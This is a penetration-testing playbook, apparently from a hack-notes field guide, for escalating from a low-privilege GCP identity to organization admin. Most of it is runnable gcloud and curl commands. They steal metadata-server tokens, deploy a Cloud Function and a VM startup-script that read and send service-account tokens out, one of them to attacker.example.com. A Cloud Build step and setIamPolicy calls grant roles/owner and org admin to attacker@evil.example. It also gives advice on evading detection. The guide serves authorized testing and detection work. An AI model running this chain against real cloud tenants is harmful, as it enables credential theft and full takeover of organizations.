---
tags:
  - hack-notes
  - playbook
  - gcp
  - cloud
---

# GCP Service Account Impersonation to Org Admin Playbook

> Start from a low-privilege GCP identity (leaked SA key, stolen GCE metadata token, or foothold user), walk a service-account impersonation chain through successively more privileged SAs, then abuse a deploy/setIamPolicy primitive to reach project then organization admin.

> **Attack graph position**
> **Fed by:** Entry point (leaked SA key / GCE metadata token / foothold user); [Kubernetes Pod to Cluster to Cloud](Kubernetes%20Pod%20to%20Cluster%20to%20Cloud.md).
> **Feeds into:** End state: GCP org admin.
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Reach `roles/owner` on a project, then `roles/resourcemanager.organizationAdmin` (or `roles/iam.organizationRoleAdmin`) on the org node |
| Starting position | Low-priv identity: a leaked `*.json` SA key, a token pulled from a compromised GCE instance metadata endpoint, or a foothold Workspace/Cloud user with minimal roles |
| End state | Org-level admin: ability to grant arbitrary roles on the org, read/modify every project |
| Key techniques | T1078.004 Valid Accounts: Cloud, T1548 Abuse Elevation Control, T1098.003 Additional Cloud Roles, T1552.005 Cloud Instance Metadata API, T1098.001 Additional Cloud Credentials |
| Prerequisites | The starting identity holds at least one impersonation or `actAs`-via-deploy primitive somewhere in the project graph (see decision branch) |
| Difficulty | Medium |
| Noise level | Moderate to Loud. `GenerateAccessToken`, `SetIamPolicy`, and deploy events are all in Cloud Audit Logs; Event Threat Detection has dedicated rules |

## Attack Path
```
[ Foothold ]
  leaked SA key  ──┐
  GCE metadata token (curl 169.254.169.254) ──┤
  foothold user  ──┘
        │  gcloud auth activate-service-account / set ADC
        ▼
[ Enumerate IAM ]  projects get-iam-policy + per-SA get-iam-policy
        │  who can impersonate whom? where is actAs? what default-SA scopes?
        ▼
[ Impersonation hop ]  --impersonate-service-account=SA-A (chain SA-A,SA-B,...)
        │
        ├── direct grant exists (Token Creator / getAccessToken) ──► hop, repeat
        │
        └── NO direct grant ──► DECISION BRANCH:
              find actAs via a deploy service instead
              (cloudfunctions deploy | compute create+startup-script |
               deploymentmanager | cloudbuild) running a privileged SA
        ▼
[ Privesc primitive ]  run code/deploy as a high-priv SA (often Editor on the
        default Compute/cloudservices SA) ──► exfil its token
        ▼
[ Project Owner ]  setIamPolicy: grant self roles/owner
        ▼
[ Org Admin ]  find an SA/user with org-node setIamPolicy ──► grant self
        roles/resourcemanager.organizationAdmin
```

## Prerequisites and Setup
- A starting credential. One of:
  - A leaked service-account JSON key file.
  - Network reach to a GCE/GKE/Cloud Run instance's metadata server (SSRF or shell on the box).
  - A foothold Google identity (compromised Workspace user, OAuth token).
- `gcloud` CLI (Cloud SDK) authenticated, plus `curl` and `jq`.
- Optional tooling, fold in where it accelerates enumeration:
  - `google/gcp_scanner` (standalone, does not need gcloud installed; maps reachable resources and which creds open them).
  - `RhinoSecurityLabs/GCP-IAM-Privilege-Escalation` (`PrivEscScanner/check_for_privesc.py` plus per-method `ExploitScripts/`).
- A scratch project/region for deploy primitives, and a callback you control only if you must exfil a token (prefer printing it; do not stand up gratuitous infra).
- Authorized scope that explicitly covers IAM modification and org-node changes. Org-admin grants are loud and high-impact, confirm rules of engagement before the final SetIamPolicy.

## Walkthrough

### Step 1. Establish the foothold credential
What and why: get a usable identity into `gcloud`/ADC. Three entry variants, run whichever matches your access.

Variant A, leaked SA key:
```bash
gcloud auth activate-service-account --key-file=/loot/leaked-sa.json
gcloud config set project victim-project-id
gcloud auth list                       # confirm active account
gcloud config get-value account
```

Variant B, steal a token from the GCE instance metadata server (shell or SSRF on a VM). The `Metadata-Flavor: Google` header is mandatory, the endpoint rejects requests without it:
```bash
# Project + identity context
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
# Which OAuth scopes does the attached SA carry (cloud-platform = full reach)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
# The access token itself
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token
```
Use the stolen token directly against the REST API or feed it to gcloud:
```bash
export TOK=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOK" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/victim-project-id:getIamPolicy" -X POST -d '{}'
# or: gcloud ... --access-token-file=<(echo -n "$TOK")
```

Variant C, foothold user: `gcloud auth login` / supply the OAuth token, then `gcloud config set project victim-project-id`.

Success signal: `gcloud auth list` shows the active identity and `gcloud projects describe victim-project-id` returns without a 403.

Decision / branch: if the default SA's scopes (Variant B) do NOT include `cloud-platform` (e.g. only `devstorage.read_only`), the token is scope-limited even though the SA's IAM roles may be broad. Note it: scope-restricted tokens still read GCS but cannot call IAM. Pivot to a deploy primitive (Step 6) that runs the SA fresh with full scope rather than reusing this token.

### Step 2. Enumerate identities, projects, and the org tree
What and why: map where you are and what is reachable before touching anything mutating.
```bash
gcloud projects list                                   # projects you can see
gcloud organizations list                              # org id, if visible
gcloud resource-manager folders list --organization=ORG_ID 2>/dev/null
gcloud iam service-accounts list --project=victim-project-id
gcloud config list
```
Pull the active identity's own granted permissions to know your floor:
```bash
gcloud projects get-iam-policy victim-project-id \
  --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)" \
  --format="table(bindings.role)"
```
Success signal: a list of SAs and at least one project you can describe. Record the org id, it is the final target node.

### Step 3. Map the impersonation graph (who can act as whom)
What and why: this is the core recon. For every SA, read its resource IAM policy and look for principals (your identity, or SAs you can reach) holding `roles/iam.serviceAccountTokenCreator`, `roles/iam.serviceAccountUser` (actAs), or `roles/iam.workloadIdentityUser`.
```bash
# Project-level policy: who holds Token Creator / actAs broadly
gcloud projects get-iam-policy victim-project-id --format=json > /tmp/proj-policy.json
jq -r '.bindings[] | select(.role|test("serviceAccountTokenCreator|serviceAccountUser|workloadIdentityUser|owner|editor|setIamPolicy")) | "\(.role)\t\(.members[])"' /tmp/proj-policy.json

# Per-SA resource policy (impersonation grants live HERE, not just at project level)
for SA in $(gcloud iam service-accounts list --project=victim-project-id --format="value(email)"); do
  echo "=== $SA ==="
  gcloud iam service-accounts get-iam-policy "$SA" --project=victim-project-id --format=json \
    | jq -r '.bindings[]? | "\(.role)\t\(.members[])"'
done
```
Faster path with tooling: run the Rhino scanner to auto-flag escalations.
```bash
# Rhino: enumerate all testable permissions for the current creds, then check
python3 enumerate_member_permissions.py -p victim-project-id            # writes all_perms.json
python3 check_for_privesc.py                                            # flags each privesc method present
```
What you are hunting:
- A direct grant where your identity (or a reachable SA) is `serviceAccountTokenCreator` on a more privileged SA -> direct impersonation hop (Step 4).
- Implicit delegation: you have `iam.serviceAccounts.implicitDelegation` on SA-X, and SA-X has `getAccessToken` on SA-Y. You can mint a SA-Y token through SA-X without a direct grant on SA-Y.
- `actAs`/`serviceAccountUser` plus a deploy permission (`cloudfunctions.functions.create`, `compute.instances.create`, `deploymentmanager.deployments.create`, `cloudbuild.builds.create`). That is the no-direct-impersonation branch (Step 6).

Success signal: at least one edge from your current identity toward a higher-privilege SA.

### Step 4. Hop via direct impersonation (Token Creator / getAccessToken)
What and why: if you hold Token Creator on SA-A, mint its access token and run as it. No JSON key is created, so no `CreateServiceAccountKey` audit entry, only a `GenerateAccessToken` data-access log.
```bash
# One-off command as SA-A
gcloud iam service-accounts get-iam-policy admin-sa@victim-project-id.iam.gserviceaccount.com \
  --impersonate-service-account=admin-sa@victim-project-id.iam.gserviceaccount.com

# Mint a raw token for reuse / REST
gcloud auth print-access-token \
  --impersonate-service-account=admin-sa@victim-project-id.iam.gserviceaccount.com
```
Chained impersonation when you must hop through an intermediate (you -> SA-A -> SA-B). Comma-separated, left to right, each SA needs Token Creator on the next:
```bash
gcloud projects get-iam-policy victim-project-id \
  --impersonate-service-account=sa-a@victim-project-id.iam.gserviceaccount.com,sa-b@victim-project-id.iam.gserviceaccount.com
```
Implicit-delegation variant (no direct grant on the target, only on the middle SA):
```bash
# Rhino exploit script handles the delegation token dance
python3 ExploitScripts/iam.serviceAccounts.implicitDelegation.py \
  -t target-high-priv-sa@victim-project-id.iam.gserviceaccount.com
```
`signJwt` variant (you have `iam.serviceAccounts.signJwt` but not `getAccessToken`): sign a well-formed JWT as the SA and exchange it at the OAuth token endpoint for that SA's access token.
```bash
python3 ExploitScripts/iam.serviceAccounts.signJwt.py \
  -t target-sa@victim-project-id.iam.gserviceaccount.com
```
Success signal: `gcloud auth print-access-token --impersonate-service-account=...` returns a `ya29.` token, and a `get-iam-policy` run as that SA succeeds where yours got 403.

Decision / branch: if every impersonation call returns `PERMISSION_DENIED` (no Token Creator anywhere you can reach), STOP chaining tokens and go to Step 6 (actAs via deploy). If a hop works but lands on an SA that is still not Owner, repeat Steps 3-4 from the new SA's vantage (re-enumerate the graph as the new identity).

### Step 5. Identify the highest-privilege SA you can reach
What and why: before burning a deploy primitive, confirm which reachable SA is closest to project control. The default SAs are the usual jackpot:
- Compute Engine default SA `PROJECT_NUMBER-compute@developer.gserviceaccount.com` is created with the basic `Editor` role.
- The Google APIs / cloudservices SA `PROJECT_NUMBER@cloudservices.gserviceaccount.com` runs Deployment Manager resources and is typically `Editor`.
- The Cloud Build SA `PROJECT_NUMBER@cloudbuild.gserviceaccount.com` (legacy) carries broad project access.
```bash
PROJNUM=$(gcloud projects describe victim-project-id --format='value(projectNumber)')
echo "compute default: ${PROJNUM}-compute@developer.gserviceaccount.com"
echo "cloudservices:   ${PROJNUM}@cloudservices.gserviceaccount.com"
# Confirm its roles
jq -r --arg n "$PROJNUM" '.bindings[] | select(.members[]|test("compute@developer|@cloudservices|@cloudbuild")) | "\(.role)\t\(.members[])"' /tmp/proj-policy.json
```
Success signal: a default or custom SA with `roles/editor`/`roles/owner` that you can reach by impersonation or by an actAs-deploy.

### Step 6. Privesc primitive: run code as a high-priv SA (the actAs branch)
What and why: this is the no-direct-impersonation route and the most reliable real-world path. You do not need `getAccessToken` on the target SA, you need `actAs` (serviceAccountUser) on it plus a deploy permission. The deploy service attaches the privileged SA to a resource you control, and you exfil its token at runtime. Pick the primitive that matches the permission you hold.

Primitive A, Cloud Function deploy (classic Function Admin / ConfusedFunction style). Deploy a function that runs as the privileged SA and prints its metadata token:
```bash
mkdir fn && cd fn
cat > main.py <<'PY'
import urllib.request
def exfil(request):
    h = {"Metadata-Flavor": "Google"}
    u = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    req = urllib.request.Request(u, headers=h)
    return urllib.request.urlopen(req).read()
PY
echo "functions-framework==3.*" > requirements.txt
# 2nd-gen syntax; --service-account binds the privileged SA (requires actAs on it)
gcloud functions deploy exfil \
  --gen2 --runtime=python312 --region=us-central1 \
  --source=. --entry-point=exfil --trigger-http --allow-unauthenticated \
  --service-account=admin-sa@victim-project-id.iam.gserviceaccount.com \
  --project=victim-project-id
URL=$(gcloud functions describe exfil --gen2 --region=us-central1 --format='value(serviceConfig.uri)')
curl -s "$URL" | jq -r .access_token        # token of admin-sa
```
Note on ConfusedFunction (Tenable, 2024): historically the Cloud Build SA backing the function build was over-privileged and could be abused even without `actAs` on the runtime SA. Google reduced default Cloud Build SA permissions and migrated to the Compute Engine default SA for builds (mid-2024), so the build-side leg is mostly closed on current tenants. The runtime `--service-account` actAs leg above still works wherever you hold actAs.

Primitive B, Compute instance with a startup-script (compute.instances.create + actAs). The VM boots as the high-priv SA and the startup script exfils its token:
```bash
gcloud compute instances create pwn-vm \
  --zone=us-central1-a --machine-type=e2-small \
  --service-account=admin-sa@victim-project-id.iam.gserviceaccount.com \
  --scopes=https://www.googleapis.com/auth/cloud-platform \
  --metadata=startup-script='#!/bin/bash
TOK=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"access_token\"])")
curl -s -X POST https://attacker.example.com/c -d "$TOK"' \
  --project=victim-project-id
```
Setting `--scopes=cloud-platform` is the scope-abuse step: it overrides any narrow default scope so the SA's full IAM roles are usable from the token. Prefer reading the token off the box (serial console / SSH) over an external callback when scope allows, to keep it in-environment.

Primitive C, Deployment Manager (deploymentmanager.deployments.create). DM resources are created by `PROJECT_NUMBER@cloudservices.gserviceaccount.com`, which is Editor. You do not even need actAs, the deployment runs as cloudservices:
```bash
python3 ExploitScripts/deploymentmanager.deployments.create.py \
  -p victim-project-id
# Or hand-roll: a DM template that creates a VM running cloudservices with a
# startup-script that grants your user roles/owner, or that creates an SA key.
```

Primitive D, Cloud Build (cloudbuild.builds.create). The build runs as the Cloud Build SA; have the build step setIamPolicy or print the SA token:
```bash
cat > cloudbuild.yaml <<'YAML'
steps:
- name: gcr.io/cloud-builders/gcloud
  entrypoint: bash
  args:
  - -c
  - |
    gcloud projects add-iam-policy-binding victim-project-id \
      --member="user:attacker@evil.example" --role="roles/owner"
YAML
gcloud builds submit --no-source --config=cloudbuild.yaml --project=victim-project-id
```

Decision / branch: ConfusedComposer (Tenable, 2025) is the Composer analogue, if the target runs Cloud Composer and you hold `composer.environments.update`, editing the env triggers a Cloud Build that historically ran as the privileged Cloud Build SA. Google migrated Composer 2 (>= 2.10.2) to the environment's own SA for PyPI installs by April 2025, so this works only on older/unpatched Composer environments. Test it if Composer is present and other primitives are blocked.

Success signal: you hold a token or session for an Editor/Owner-grade SA, or your user already received a role binding from the build step.

### Step 7. Grant yourself project Owner (SetIamPolicy)
What and why: with an Editor/Owner-class identity, add your controlled principal as project Owner to lock in durable control. (Editor cannot setIamPolicy by default, so this needs an Owner-grade SA or the cloudservices/build path from Step 6.)
```bash
# As the privileged SA (impersonated or via the deploy step)
gcloud projects add-iam-policy-binding victim-project-id \
  --member="user:attacker@evil.example" \
  --role="roles/owner" \
  --impersonate-service-account=admin-sa@victim-project-id.iam.gserviceaccount.com
```
Success signal: `gcloud projects get-iam-policy victim-project-id` lists your principal under `roles/owner`.

### Step 8. Escalate to organization admin
What and why: project Owner is not org admin. Find an SA or user with `setIamPolicy` on the org node (often a CI/CD or "org-admin" SA, or a misconfigured default that you can now impersonate as Owner). Reusing the impersonation graph, locate one principal that can mutate the org policy, then grant yourself org admin.
```bash
# Read the org policy: who can setIamPolicy / is already org admin
gcloud organizations get-iam-policy ORG_ID --format=json > /tmp/org-policy.json
jq -r '.bindings[] | select(.role|test("organizationAdmin|resourcemanager.organization|iam.organizationRoleAdmin|owner")) | "\(.role)\t\(.members[])"' /tmp/org-policy.json

# Impersonate a reachable SA that holds org-node setIamPolicy, then grant self
gcloud organizations add-iam-policy-binding ORG_ID \
  --member="user:attacker@evil.example" \
  --role="roles/resourcemanager.organizationAdmin" \
  --impersonate-service-account=org-admin-sa@mgmt-project.iam.gserviceaccount.com
```
If no SA can touch the org node, the realistic ceiling is per-project Owner across every project the impersonated SA can reach, loop Steps 3-7 per project. Note the boundary in the report rather than forcing a non-existent org edge.

Success signal: `gcloud organizations get-iam-policy ORG_ID` shows your principal as `roles/resourcemanager.organizationAdmin`. You can now grant any role on any project in the org. Stop here, the primitive is proven.

## OPSEC and Detection
Every leg of this chain writes to Cloud Audit Logs and trips named detections. Assume a tuned SOC sees it.
- `GenerateAccessToken` / `GenerateIdToken` (Admin Activity + Data Access logs, `serviceName: iamcredentials.googleapis.com`). Each impersonation hop logs the caller and the target SA. Event Threat Detection has impersonation and anomalous-token rules. Chained impersonation produces a log per hop.
- `SetIamPolicy` (Admin Activity, always on, cannot be disabled). Adding `roles/owner` or `organizationAdmin` is the single loudest event in this chain. ETD flags "anomalous IAM grant" and external-member grants on sensitive roles. Granting an external (non-org-domain) member is especially noisy.
- Deploy events: `google.cloud.functions...CreateFunction`, `compute.instances.insert`, `deploymentmanager...insert`, `cloudbuild...CreateBuild`. The deploy plus an immediate IAM change is a high-fidelity correlation for SOCs.
- `CreateServiceAccountKey` is the loudest credential event, ETD has a dedicated finding. Prefer impersonation (`getAccessToken`) and deploy-runtime tokens, which avoid key creation entirely.
- SA-key usage anomalies: stolen JSON keys used from a new ASN/geo trigger ETD's "service account key abuse" / anomalous-credential findings. Stolen metadata tokens used off-instance (different source IP than the VM) are similarly anomalous.
- Reduce noise: enumerate read-only first and stop if scope is blocked (read calls are far quieter than mutations). Use existing service accounts and existing regions/zones rather than novel ones. Prefer printing/reading a token in-environment over an external callback. Make the smallest IAM change that proves control, do not bulk-grant. Operate from an IP consistent with the environment (e.g. from the compromised VM) where possible.

## Cleanup
Revert in reverse order of creation. Keep an artifact log as you go.
```bash
# 1. Remove org + project IAM bindings you added
gcloud organizations remove-iam-policy-binding ORG_ID \
  --member="user:attacker@evil.example" --role="roles/resourcemanager.organizationAdmin"
gcloud projects remove-iam-policy-binding victim-project-id \
  --member="user:attacker@evil.example" --role="roles/owner"

# 2. Delete deploy artifacts
gcloud functions delete exfil --gen2 --region=us-central1 --project=victim-project-id -q
gcloud compute instances delete pwn-vm --zone=us-central1-a --project=victim-project-id -q
gcloud deployment-manager deployments delete pwn-deploy --project=victim-project-id -q
# Cloud Build runs are immutable history; note the build id in the report, nothing to delete

# 3. Delete any SA keys you created (if a key path was used)
gcloud iam service-accounts keys list --iam-account=admin-sa@victim-project-id.iam.gserviceaccount.com
gcloud iam service-accounts keys delete KEY_ID --iam-account=admin-sa@victim-project-id.iam.gserviceaccount.com -q

# 4. Revoke local creds
gcloud auth revoke --all
```
- Securely destroy any token/key loot files (`/loot/*.json`, exfil'd `ya29.` tokens) and rotate any callback infra.
- Impersonation tokens are short-lived (default 1h) and self-expire, note them in the report but there is nothing to delete.
- Hand the SOC the list of audit events you generated (build ids, function name, instance name, binding diffs) so they can validate detection coverage.

## Troubleshooting
- `PERMISSION_DENIED` on `--impersonate-service-account`: you lack `iam.serviceAccounts.getAccessToken` (Token Creator) on the target. Re-check the SA's resource policy (Step 3), not just the project policy. Switch to the actAs-via-deploy branch (Step 6).
- Token works but IAM calls fail with insufficient-scope: the metadata/default token has a narrow OAuth scope (e.g. `devstorage.read_only`), not `cloud-platform`. Scopes cap a token regardless of the SA's roles. Re-acquire via impersonation (`print-access-token`, always full scope) or deploy a VM with `--scopes=cloud-platform`.
- `compute.instances.create` rejected for "can act as service account": you lack `actAs` (serviceAccountUser) on the SA you tried to attach. Either get actAs, attach a different SA you can act as, or use Deployment Manager (Primitive C) which runs as cloudservices without your actAs.
- Org Policy constraints block the deploy: `constraints/iam.disableServiceAccountKeyCreation` blocks key creation (use impersonation instead); `constraints/compute.vmExternalIpAccess` or `constraints/iam.allowedPolicyMemberDomains` (domain-restricted sharing) blocks adding an external member. If domain-restricted sharing is on, you cannot add `attacker@evil.example`, instead create/control an in-domain principal or an in-domain SA and grant that.
- Cloud Function deploy hangs or build fails: 1st vs 2nd gen mismatch, force `--gen2`; ensure `--region` is set and the Cloud Functions and Cloud Build APIs are enabled (`gcloud services enable cloudfunctions.googleapis.com cloudbuild.googleapis.com`).
- ConfusedFunction/ConfusedComposer build-side leg does nothing: the target is patched (Cloud Build SA de-privileged mid-2024, Composer 2 SA migration by April 2025). Fall back to the runtime `--service-account` actAs leg or another primitive.
- `add-iam-policy-binding` fails with ETAG mismatch: the policy changed under you, re-read with `get-iam-policy` and retry; or use `--condition=None` if a conditional binding is in play.
- Workload Identity Federation angle: if you control an external identity (e.g. an OIDC token from a CI provider or another cloud) that maps into a GCP SA via a poorly scoped WIF pool (`attribute-condition` too loose), exchange it at `sts.googleapis.com` for a federated token, then `iamcredentials...generateAccessToken` to impersonate the bound SA. Misconfigured `attribute-mapping`/`attribute-condition` lets any holder of a matching external token federate in. Treat the resulting SA as a Step 4 starting point.

## Variations and Pivots
- Start from CI/CD instead of a VM: a compromised GitHub Actions/GitLab runner with a GCP WIF binding is the same chain with the WIF exchange replacing Step 1. See [CICD Pipeline](../Checklists/CICD%20Pipeline.md) and [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md).
- Start from a GKE pod: hit the node metadata server (or a workload-identity-bound KSA) for a token, then enter at Step 2. See [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md) and [Kubernetes and Container Breakout](../Cheatsheets/Kubernetes%20and%20Container%20Breakout.md).
- Lateral instead of vertical: once you hold an Editor/Owner SA, enumerate cross-project bindings, the same SA is frequently bound across multiple projects, giving breadth without the org-node step.
- Persistence from Owner: create a new SA with Owner and a downloaded key, or add a stealth conditional IAM binding. (Note in report; respect rules of engagement, prefer reversible.)
- Org enumeration and exfil after admin: dump every project policy, Cloud Storage, and Secret Manager across the org. Treat as a separate authorized phase.

## Related
- [GCP Cloud Penetration Test](../Checklists/GCP%20Cloud%20Penetration%20Test.md)
- [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md)
- [CICD Pipeline](../Checklists/CICD%20Pipeline.md)
- [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
- Cepheus
- Vinculum
- Ariadne
- [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md)
- [Kubernetes and Container Breakout](../Cheatsheets/Kubernetes%20and%20Container%20Breakout.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
